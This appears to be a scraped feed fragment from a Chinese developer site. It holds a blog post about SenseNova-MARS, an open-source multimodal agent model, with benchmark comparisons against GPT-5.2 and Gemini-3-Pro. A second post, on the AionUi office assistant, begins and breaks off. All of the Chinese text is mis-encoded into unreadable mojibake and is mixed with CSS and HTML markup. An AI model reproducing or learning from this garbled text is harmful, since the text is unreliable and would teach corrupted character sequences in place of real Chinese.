ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>2026å¹´çš„å¼€å¹´å¤§æˆï¼Œæ¯”æˆ‘æƒ³è±¡ä¸­æ¥å¾—æ›´æ—©ä¸€äº›ã€‚</p>
<p>å°±åœ¨1æœˆ30æ—¥ï¼Œå½“å¤§å®¶è¿˜åœ¨è®¨è®ºGPT-5.2çš„é€»è¾‘æ¨ç†æ˜¯å¦å·²ç»è§¦é¡¶æ—¶ï¼Œå•†æ±¤ç§‘æŠ€æ‚„æ— å£°æ¯åœ°ä¸¢å‡ºäº†ä¸€æšé‡ç£…ç‚¸å¼¹ï¼šSenseNova-MARSã€‚è¿™ä¸æ˜¯åˆä¸€ä¸ªåªä¼šâ€œçœ‹å›¾è¯´è¯â€çš„å¤šæ¨¡æ€æ¨¡å‹ï¼Œè€Œæ˜¯ä¸€ä¸ªèƒ½è‡ªä¸»æ€è€ƒã€ä¼šç”¨å·¥å…·ã€ç”šè‡³æœ‰ç‚¹â€œä¾¦æ¢ç›´è§‰â€çš„æ™ºèƒ½ä½“ã€‚</p>
<p>æœ€è®©åœˆå†…äººå’‹èˆŒçš„ä¸æ˜¯å®ƒçš„æŠ€æœ¯æ¶æ„ï¼Œè€Œæ˜¯é‚£ä¸ªåˆºçœ¼çš„åˆ†æ•°â€”â€”åœ¨å¤šæ¨¡æ€æœç´¢ä¸æ¨ç†çš„ç»¼åˆå¹³å‡åˆ†ä¸Šï¼Œå®ƒæ‹¿ä¸‹äº†69.74åˆ†ã€‚</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.worldcodeing.com%2Fwp-content%2Fuploads%2F2026%2F01%2Fasdfsadfs-1024x501.webp" target="_blank" title="https://blog.worldcodeing.com/wp-content/uploads/2026/01/asdfsadfs-1024x501.webp" ref="nofollow noopener noreferrer"><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b960e5eb9cb146a796f6c6582f8a72aa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo6aOO5aaC6Zuq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770382164&amp;x-signature=ndsxMFQ%2B%2BTPj8DzUNA%2F3P5nYilA%3D" alt="asdfsadfs" loading="lazy"/></a></p>
<p>è¿™ä¸ªæ•°å­—æ„å‘³ç€ä»€ä¹ˆï¼Ÿæ„å‘³ç€å®ƒåœ¨çº¸é¢å®åŠ›ä¸Šï¼Œå‹è¿‡äº†è°·æ­Œçš„Gemini-3-Proï¼ˆ69.06åˆ†ï¼‰ï¼Œä¹Ÿè¶…è¿‡äº†OpenAIçš„GPT-5.2ï¼ˆ67.64åˆ†ï¼‰ã€‚è€Œä¸”ï¼Œå®ƒè¿˜æ˜¯å¼€æºçš„ã€‚</p>
<h3 data-id="heading-0">ä¸æ­¢æ˜¯â€œçœ‹â€ï¼Œå®ƒå­¦ä¼šäº†â€œæŸ¥â€</h3>
<p>è¿‡å»æˆ‘ä»¬ç©å¤šæ¨¡æ€æ¨¡å‹ï¼ˆVLMï¼‰ï¼Œæµç¨‹é€šå¸¸æ˜¯è¿™æ ·çš„ï¼šä½ æ‰”ç»™AIä¸€å¼ å›¾ï¼Œé—®å®ƒâ€œè¿™æ˜¯å“ªï¼Ÿâ€ï¼ŒAIä¾é è®­ç»ƒæ—¶è®°ä½çš„çŸ¥è¯†åº“ï¼Œè¿æ°”å¥½èƒ½è’™å¯¹ï¼Œè¿æ°”ä¸å¥½å°±å¼€å§‹ä¸€æœ¬æ­£ç»åœ°èƒ¡è¯´å…«é“ã€‚</p>
<p>SenseNova-MARSçš„é€»è¾‘å®Œå…¨ä¸åŒã€‚å®ƒæ›´åƒæ˜¯ä¸€ä¸ªéšèº«æºå¸¦äº†æ”¾å¤§é•œå’Œç™¾ç§‘å…¨ä¹¦çš„ç¦å°”æ‘©æ–¯ã€‚</p>
<p>å•†æ±¤è¿™æ¬¡ä¸»æ‰“çš„æ¦‚å¿µå«â€œè‡ªä¸»è§„åˆ’â€ä¸â€œå¤šå·¥å…·åä½œâ€ã€‚ç®€å•æ¥è¯´ï¼Œå½“è¿™ä¸ªæ¨¡å‹é¢å¯¹ä¸€ä¸ªå¤æ‚é—®é¢˜æ—¶ï¼Œå®ƒä¸å†æ˜¯é â€œçŒœâ€ï¼Œè€Œæ˜¯é â€œæŸ¥â€ã€‚å®ƒèƒ½åƒäººç±»ä¸€æ ·ï¼ŒæŠŠä¸€ä¸ªå¤§é—®é¢˜æ‹†è§£æˆå‡ ä¸ªæ­¥éª¤ï¼š</p>
<ol>
<li><strong>è§‚å¯Ÿ</strong>ï¼šçœ‹åˆ°å›¾é‡Œçš„ç‰©ä½“ã€‚</li>
<li><strong>è§„åˆ’</strong>ï¼šæ€è€ƒéœ€è¦ä»€ä¹ˆä¿¡æ¯æ‰èƒ½å›ç­”é—®é¢˜ã€‚</li>
<li><strong>è¡ŒåŠ¨</strong>ï¼šè°ƒç”¨å·¥å…·å»è·å–ä¿¡æ¯ï¼ˆæ¯”å¦‚åˆ‡å‰²å›¾ç‰‡ã€æœç´¢ç½‘ç»œï¼‰ã€‚</li>
<li><strong>åé¦ˆ</strong>ï¼šæ ¹æ®æœåˆ°çš„ç»“æœä¿®æ­£ç­”æ¡ˆã€‚</li>
</ol>
<p>ä¸¾ä¸ªå¾ˆç°å®çš„ä¾‹å­ï¼šç»™å®ƒä¸€å¼ F1èµ›è½¦æ‰‹çš„ç…§ç‰‡ï¼Œé—®â€œè¿™ä¸ªè½¦æ‰‹æ‰€åœ¨çš„è½¦é˜Ÿæˆç«‹äºå“ªä¸€å¹´ï¼Ÿâ€ã€‚</p>
<p>æ™®é€šæ¨¡å‹å¯èƒ½ä¼šç›¯ç€èµ›è½¦æœä¸Šçš„æ¨¡ç³ŠLogoå‘å‘†ã€‚ä½†SenseNova-MARSä¼šå…ˆè°ƒç”¨<strong>å›¾åƒè£å‰ªå·¥å…·</strong>ï¼ŒæŠŠé‚£ä¸ªåªå ç”»é¢ä¸åˆ°5%çš„å¾®å°Logoåˆ‡å‡ºæ¥æ”¾å¤§ï¼›è¯†åˆ«æ¸…æ¥šåï¼Œç«‹åˆ»å¯åŠ¨<strong>å›¾æ–‡æœç´¢</strong>ï¼Œå»ç½‘ä¸ŠæŸ¥è¿™ä¸ªLogoå¯¹åº”çš„å“ç‰Œï¼›ç¡®è®¤å“ç‰Œæ˜¯æŸæŸè½¦é˜Ÿåï¼Œå†è¿›è¡ŒäºŒæ¬¡æœç´¢æŸ¥è¯¢è¯¥è½¦é˜Ÿçš„æˆç«‹å¹´ä»½ã€‚</p>
<p>è¿™å¥—â€œè¯†åˆ«-æŸ¥è¯¢-è®¡ç®—â€çš„è¿æ‹›ï¼Œå°±æ˜¯å®ƒå¾—åˆ†æ¯”GPT-5.2é«˜çš„ç§˜è¯€ã€‚ç‰¹åˆ«æ˜¯åœ¨HR-MMSearchï¼ˆé«˜æ¸…ç»†èŠ‚æœç´¢ï¼‰è¿™é¡¹è¢«èª‰ä¸ºâ€œAIç•Œå¥¥æ—åŒ¹å…‹â€çš„æµ‹è¯•ä¸­ï¼Œå®ƒæ‹¿åˆ°äº†54.43åˆ†ï¼Œè¿œè¶…é‚£äº›è™½ç„¶å‚æ•°å·¨å¤§ä½†åªä¼šâ€œå•æ¬¡ç›´è§‰æ¨ç†â€çš„é—­æºæ¨¡å‹ã€‚</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.worldcodeing.com%2Fwp-content%2Fuploads%2F2026%2F01%2Fdsgdfgsfd.webp" target="_blank" title="https://blog.worldcodeing.com/wp-content/uploads/2026/01/dsgdfgsfd.webp" ref="nofollow noopener noreferrer"><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6702443365f14382972fb686cd16238c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo6aOO5aaC6Zuq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770382164&amp;x-signature=JAs76pF%2BExXS5VOTpy5IScKUMcw%3D" alt="dsgdfgsfd" loading="lazy"/></a></p>
<h3 data-id="heading-1">æ€ä¹ˆç»ƒå‡ºâ€œç›´è§‰â€çš„ï¼Ÿ</h3>
<p>è¦æŠŠAIè®­ç»ƒæˆè¿™æ ·å¹¶ä¸å®¹æ˜“ã€‚è¿™å°±å¥½æ¯”æ•™ä¸€ä¸ªå­¦ç”Ÿï¼Œå…‰è®©ä»–èƒŒä¹¦ï¼ˆé¢„è®­ç»ƒï¼‰æ˜¯ä¸å¤Ÿçš„ï¼Œä½ å¾—è®©ä»–å»å®ä¹ ï¼Œå»è§£å†³å®é™…é—®é¢˜ã€‚</p>
<p>å•†æ±¤å›¢é˜Ÿè¿™æ¬¡é‡‡ç”¨äº†ä¸€ç§åŒé˜¶æ®µçš„è®­ç»ƒç­–ç•¥ï¼Œéå¸¸æœ‰æ„æ€ï¼š</p>
<p>ç¬¬ä¸€é˜¶æ®µå«**â€œæ‰“åŸºç¡€â€**ã€‚ä»–ä»¬åˆ©ç”¨è‡ªåŠ¨åŒ–å¼•æ“åˆæˆäº†ä¸€å¤§å †é€»è¾‘ä¸¥å¯†çš„é«˜éš¾åº¦æ¡ˆä¾‹ï¼Œåƒæ˜¯ç»™AIç¼–äº†ä¸€å¥—ã€Šä¾¦æ¢å…¥é—¨æŒ‡å—ã€‹ï¼Œå¼ºåˆ¶å®ƒå­¦ä¹ åŸºç¡€çš„å·¥å…·ä½¿ç”¨é€»è¾‘ã€‚</p>
<p>ç¬¬äºŒé˜¶æ®µå«**â€œç»ƒå®æˆ˜â€<strong>ã€‚è¿™æ˜¯æ‹‰å¼€å·®è·çš„å…³é”®ã€‚ä»–ä»¬å¼•å…¥äº†å¼ºåŒ–å­¦ä¹ ï¼Œé…åˆä¸€ç§åä¸º</strong>BN-GSPO**çš„ç®—æ³•ã€‚è¿™å°±å¥½æ¯”æŠŠAIæ‰”è¿›æ¨¡æ‹Ÿå®æˆ˜æ¼”ç»ƒï¼Œåšå¯¹äº†ç»™å¥–åŠ±ï¼Œåšé”™äº†æ²¡ç³–åƒã€‚ä¹…è€Œä¹…ä¹‹ï¼Œæ¨¡å‹å°±åŸ¹å…»å‡ºäº†ä¸€ç§â€œå·¥å…·ä½¿ç”¨ç›´è§‰â€ã€‚å®ƒä¸å†æ˜¯æœºæ¢°åœ°è°ƒç”¨å·¥å…·ï¼Œè€Œæ˜¯çŸ¥é“åœ¨ä»€ä¹ˆæƒ…å†µä¸‹è¯¥æœå›¾ï¼Œä»€ä¹ˆæƒ…å†µä¸‹è¯¥æœå­—ï¼Œç”šè‡³çŸ¥é“ä»€ä¹ˆæ—¶å€™è¯¥åœä¸‹æ¥æ€è€ƒã€‚</p>
<h3 data-id="heading-2">ç»™å¼€å‘è€…çš„ä¸€ä»½å¤§ç¤¼</h3>
<p>å¯¹äºæˆ‘ä»¬åœ¨AIåœˆæ‘¸çˆ¬æ»šæ‰“çš„äººæ¥è¯´ï¼ŒSenseNova-MARSæœ€å¸å¼•äººçš„ç‚¹åœ¨äºå®ƒçš„<strong>å¼€æº</strong>ã€‚</p>
<p>å•†æ±¤è¿™æ¬¡éå¸¸å®åœ¨ï¼Œç›´æ¥æ”¾å‡ºäº†**8Bï¼ˆ80äº¿å‚æ•°ï¼‰<strong>å’Œ</strong>32Bï¼ˆ320äº¿å‚æ•°ï¼‰**ä¸¤ä¸ªç‰ˆæœ¬ã€‚</p>
<ul>
<li><strong>8Bç‰ˆæœ¬</strong>ï¼šè½»é‡çº§ï¼Œé€‚åˆæ˜¾å­˜æœ‰é™çš„å¼€å‘è€…ï¼Œç”šè‡³æœ‰æœ›åœ¨é«˜ç«¯è¾¹ç¼˜è®¾å¤‡ä¸Šè·‘èµ·æ¥ã€‚</li>
<li><strong>32Bç‰ˆæœ¬</strong>ï¼šæ»¡è¡€ç‰ˆï¼Œé‚£ä¸ªåŠæ‰“GPT-5.2çš„æˆç»©å°±æ˜¯å®ƒè·‘å‡ºæ¥çš„ï¼Œé€‚åˆéœ€è¦æè‡´æ¨ç†èƒ½åŠ›çš„ç§‘ç ”æˆ–å•†ä¸šé¡¹ç›®ã€‚</li>
</ul>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.worldcodeing.com%2Fwp-content%2Fuploads%2F2026%2F01%2Ffsadfasdf-894x1024.webp" target="_blank" title="https://blog.worldcodeing.com/wp-content/uploads/2026/01/fsadfasdf-894x1024.webp" ref="nofollow noopener noreferrer"><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/57c14d760f0d41faacffafd975360c3d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo6aOO5aaC6Zuq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770382164&amp;x-signature=DPOlqPTQs3qigGDLQ0JcTdiwgqI%3D" alt="fsadfasdf" loading="lazy"/></a></p>
<p>è¿™æ„å‘³ç€ï¼Œä¸ç®¡æ˜¯åšå•†ä¸šæƒ…æŠ¥åˆ†æï¼ˆè‡ªåŠ¨ä»å³°ä¼šç…§ç‰‡é‡Œæ‰’ç«å“ä¿¡æ¯ï¼‰ï¼Œè¿˜æ˜¯åšå¤æ‚çš„å­¦æœ¯å›¾è¡¨éªŒè¯ï¼Œæˆ‘ä»¬ç°åœ¨éƒ½æœ‰äº†ä¸€ä¸ªSOTAï¼ˆå½“å‰æœ€ä¼˜ï¼‰çº§åˆ«çš„å¼€æºåº•åº§å¯ç”¨ã€‚æ¨¡å‹æƒé‡ã€è®­ç»ƒä»£ç ã€ç”šè‡³åˆæˆæ•°æ®é›†ï¼Œå…¨éƒ½åœ¨Hugging Faceå’ŒGitHubä¸Šå…¬å¼€äº†ã€‚</p>
<h3 data-id="heading-3">ç»“è¯­</h3>
<p>SenseNova-MARSçš„å‡ºç°ï¼ŒæŸç§ç¨‹åº¦ä¸Šæ ‡å¿—ç€å¤šæ¨¡æ€AIæ­£åœ¨ä»â€œæ„ŸçŸ¥æ—¶ä»£â€è·¨å…¥â€œè¡ŒåŠ¨æ—¶ä»£â€ã€‚</p>
<p>ä»¥å‰æˆ‘ä»¬æƒŠå¹äºAIèƒ½â€œçœ‹æ‡‚â€ä¸€å¼ å›¾ï¼Œç°åœ¨æˆ‘ä»¬å¼€å§‹è¦æ±‚AIèƒ½â€œæå®šâ€å›¾é‡Œçš„äº‹ã€‚è™½ç„¶69.74åˆ†è·ç¦»æ»¡åˆ†è¿˜æœ‰å¾ˆé•¿çš„è·¯è¦èµ°ï¼Œä½†åœ¨å¼€æºé¢†åŸŸï¼Œå•†æ±¤ç¡®å®æŠŠå¤©èŠ±æ¿å‘ä¸Šç‹ ç‹ é¡¶äº†ä¸€æˆªã€‚</p>
<p>å¦‚æœä½ æ‰‹å¤´æœ‰æ˜¾å¡ï¼Œä¸å¦¨å»ä¸‹è½½é‚£ä¸ª32Bçš„ç‰ˆæœ¬è·‘è·‘çœ‹ã€‚è¯´ä¸å®šï¼Œä½ ç”µè„‘é‡Œç°åœ¨å°±ä½ç€ä¸€ä¸ªæ¯”GPT-5.2è¿˜è¦ç²¾æ˜çš„â€œæ•°å­—ä¾¦æ¢â€ã€‚</p>
<p><strong>å¦‚æœä½ ä¹Ÿå¯¹æœ€æ–°çš„AIä¿¡æ¯æ„Ÿå…´è¶£æˆ–è€…æœ‰ç–‘é—® éƒ½å¯ä»¥åŠ å…¥æˆ‘çš„å¤§å®¶åº­ ç¬¬ä¸€æ—¶é—´åˆ†äº«æœ€æ–°AIèµ„è®¯ã€å·¥å…·ã€æ•™ç¨‹ã€æ–‡æ¡£ æ¬¢è¿ä½ çš„åŠ å…¥ï¼ï¼ï¼ğŸ˜‰ğŸ˜‰ğŸ˜‰</strong></p>
<p>å…¬ä¼—å·ï¼šå¢¨é£å¦‚é›ªå°ç«™</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä¸€å¤©ä¸€ä¸ªå¼€æºé¡¹ç›®ï¼ˆç¬¬7ç¯‡ï¼‰ï¼šAionUi - å…è´¹å¼€æºçš„è·¨å¹³å°AIåŠå…¬åŠ©æ‰‹ï¼ŒClaude Coworkçš„å®Œç¾æ›¿ä»£]]></title>    <link>https://juejin.cn/post/7601007650722611241</link>    <guid>https://juejin.cn/post/7601007650722611241</guid>    <pubDate>2026-01-30T12:56:03.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7601007650722611241" data-draft-id="7600863478929883155" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä¸€å¤©ä¸€ä¸ªå¼€æºé¡¹ç›®ï¼ˆç¬¬7ç¯‡ï¼‰ï¼šAionUi - å…è´¹å¼€æºçš„è·¨å¹³å°AIåŠå…¬åŠ©æ‰‹ï¼ŒClaude Coworkçš„å®Œç¾æ›¿ä»£"/> <meta itemprop="keywords" content="AIGC,å¼€æº,Claude"/> <meta itemprop="datePublished" content="2026-01-30T12:56:03.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å†¬å¥‡Lab"/> <meta itemprop="url" content="https://juejin.cn/user/1857501105781193"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä¸€å¤©ä¸€ä¸ªå¼€æºé¡¹ç›®ï¼ˆç¬¬7ç¯‡ï¼‰ï¼šAionUi - å…è´¹å¼€æºçš„è·¨å¹³å°AIåŠå…¬åŠ©æ‰‹ï¼ŒClaude Coworkçš„å®Œç¾æ›¿ä»£
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1857501105781193/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å†¬å¥‡Lab
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T12:56:03.000Z" title="Fri Jan 30 2026 12:56:03 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»9åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å¼•è¨€</h2>
<blockquote>
<p>"å½“AIåŠ©æ‰‹ä»äº‘ç«¯èµ°å‘æœ¬åœ°ï¼Œä»å•ä¸€æ¨¡å‹èµ°å‘å¤šæ¨¡å‹ç”Ÿæ€ï¼ŒçœŸæ­£çš„ç”Ÿäº§åŠ›é©å‘½æ‰åˆšåˆšå¼€å§‹ã€‚"</p>
</blockquote>
<p>è¿™æ˜¯"ä¸€å¤©ä¸€ä¸ªå¼€æºé¡¹ç›®"ç³»åˆ—çš„ç¬¬7ç¯‡æ–‡ç« ã€‚ä»Šå¤©å¸¦ä½ äº†è§£çš„é¡¹ç›®æ˜¯ <strong>AionUi</strong>ï¼ˆ<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FiOfficeAI%2FAionUi" target="_blank" title="https://github.com/iOfficeAI/AionUi" ref="nofollow noopener noreferrer">GitHub</a>ï¼‰ã€‚</p>
<p>å¦‚æœä½ æ­£åœ¨å¯»æ‰¾ä¸€ä¸ªå…è´¹ã€å¼€æºã€è·¨å¹³å°çš„AIåŠå…¬åŠ©æ‰‹ï¼Œèƒ½å¤Ÿæ›¿ä»£Claude Coworkä½†åŠŸèƒ½æ›´å¼ºå¤§ï¼Œé‚£ä¹ˆAionUiç»å¯¹å€¼å¾—ä½ æ·±å…¥äº†è§£ã€‚å®ƒæ”¯æŒå¤šæ¨¡å‹ã€å¤šä¼šè¯ã€WebUIè¿œç¨‹è®¿é—®ï¼Œè¿˜èƒ½è¿›è¡Œæ–‡ä»¶ç®¡ç†ã€å®æ—¶é¢„è§ˆã€AIå›¾åƒç”Ÿæˆï¼Œæ˜¯ä¸€ä¸ªçœŸæ­£çš„"24/7 AIåŠå…¬ä¼™ä¼´"ã€‚</p>
<p><strong>ä¸ºä»€ä¹ˆé€‰æ‹©è¿™ä¸ªé¡¹ç›®ï¼Ÿ</strong></p>
<ul>
<li>ğŸ†“ <strong>å®Œå…¨å…è´¹å¼€æº</strong>ï¼šApache-2.0åè®®ï¼Œæ— è®¢é˜…è´¹ç”¨</li>
<li>ğŸŒ <strong>è·¨å¹³å°æ”¯æŒ</strong>ï¼šmacOSã€Windowsã€Linuxå…¨å¹³å°</li>
<li>ğŸ¤– <strong>å¤šæ¨¡å‹ç”Ÿæ€</strong>ï¼šæ”¯æŒGeminiã€Claudeã€OpenAIã€Qwenã€Ollamaç­‰</li>
<li>ğŸŒ <strong>WebUIè¿œç¨‹è®¿é—®</strong>ï¼š24/7éšæ—¶è®¿é—®ï¼Œæ”¯æŒç§»åŠ¨è®¾å¤‡</li>
<li>ğŸ“ <strong>æ™ºèƒ½æ–‡ä»¶ç®¡ç†</strong>ï¼šAIé©±åŠ¨çš„æ–‡ä»¶ç»„ç»‡å’Œå¤„ç†</li>
<li>ğŸ“„ <strong>å®æ—¶é¢„è§ˆ</strong>ï¼šæ”¯æŒ9+ç§æ ¼å¼çš„å³æ—¶é¢„è§ˆ</li>
<li>ğŸ¨ <strong>AIå›¾åƒç”Ÿæˆ</strong>ï¼šé›†æˆå¤šç§å›¾åƒç”Ÿæˆæ¨¡å‹</li>
</ul>
<h3 data-id="heading-1">ä½ å°†å­¦åˆ°ä»€ä¹ˆ</h3>
<ul>
<li>AionUiçš„æ ¸å¿ƒåŠŸèƒ½å’Œæ¶æ„è®¾è®¡</li>
<li>å¦‚ä½•é…ç½®å’Œä½¿ç”¨å¤šæ¨¡å‹AIåŠ©æ‰‹</li>
<li>WebUIè¿œç¨‹è®¿é—®çš„é…ç½®å’Œä½¿ç”¨</li>
<li>æ–‡ä»¶ç®¡ç†å’Œé¢„è§ˆåŠŸèƒ½çš„ä½¿ç”¨æŠ€å·§</li>
<li>AIå›¾åƒç”Ÿæˆå’Œç¼–è¾‘åŠŸèƒ½</li>
<li>ä¸Claude Coworkçš„å¯¹æ¯”åˆ†æ</li>
<li>å¦‚ä½•å¿«é€Ÿä¸Šæ‰‹ä½¿ç”¨AionUi</li>
</ul>
<h3 data-id="heading-2">å‰ç½®çŸ¥è¯†</h3>
<ul>
<li>å¯¹AIåŠ©æ‰‹æœ‰åŸºæœ¬äº†è§£</li>
